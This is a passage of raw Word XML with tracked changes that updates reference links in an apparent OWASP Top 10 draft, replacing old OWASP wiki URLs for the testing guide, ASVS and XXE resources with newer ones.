          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E68847" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00AC649A" w:rsidRDefault="00B74248" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55F83E46"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92" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2093" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2F79E091"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094" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B06B60D" w14:textId="51A09B36" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="003E073E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2095" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2096" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [OWASP Testing Guide: Configuration </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Management](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2097" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="2098" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2099" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/latest/4-Web_Application_Security_</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing</w:t>
      </w:r>
      <w:del w:id="2100" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>_for_configuration_management)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2101" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">/02-Configuration_and_Deployment_Management_Testing/README) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="635CBE32"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02" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2103" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2104" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [OWASP Testing Guide: Testing for Error </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Codes](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2105" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="2106" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2107" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/08-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing_for_Error_</w:t>
      </w:r>
      <w:del w:id="2108" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>Code_(OWASP-IG-006))</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="77F97F6B"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09" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2110" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [OWASP Security Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="399A245B"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11" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B82FBA4" w14:textId="4543940E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2112" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2113" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Handling/01-Testing_</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>For</w:t>
      </w:r>
      <w:del w:id="2114" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> additional requirements in this area, see the </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2115" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">_Improper_Error_Handling) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6AFCCA92" w14:textId="1039CB3C" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2116" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Application Security Verification Standard </w:t>
      </w:r>
      <w:del w:id="2117" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>[V19</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2118" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>V14</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Configuration](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2119" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>www.owasp.org/index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2120" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>github.com/OWASP</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/ASVS</w:t>
      </w:r>
      <w:del w:id="2121" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>_V19_Configuration).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2122" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/blob/master/4.0/en/0x22-V14-Config.md) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="14367632"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23" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="086114E3" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2124" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2125" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A4:2017 XML External Entities (XXE)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0F6B0F33"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26" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2127" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>## References</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1932DCFD"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28" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F5497FF"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29" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2130" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7B57F36A"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31" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78222B48"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32" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2133" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [OWASP Application Security Verification Standard](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="51E35A13"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34" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2135" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [OWASP Testing Guide: Testing for XML Injection](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008))</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1A035A8E"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36" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2137" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [OWASP XXE Vulnerability](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0DB5B049" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9"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38" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2139" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [OWASP Cheat Sheet: XXE Prevention](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0E38AAED" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="005C43E9"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40" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2141" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [OWASP Cheat Sheet: XML Security](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2F0207BC"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42" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BEF95A1"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43" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="314C35A1"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44" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53B229F1"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45" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2146" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
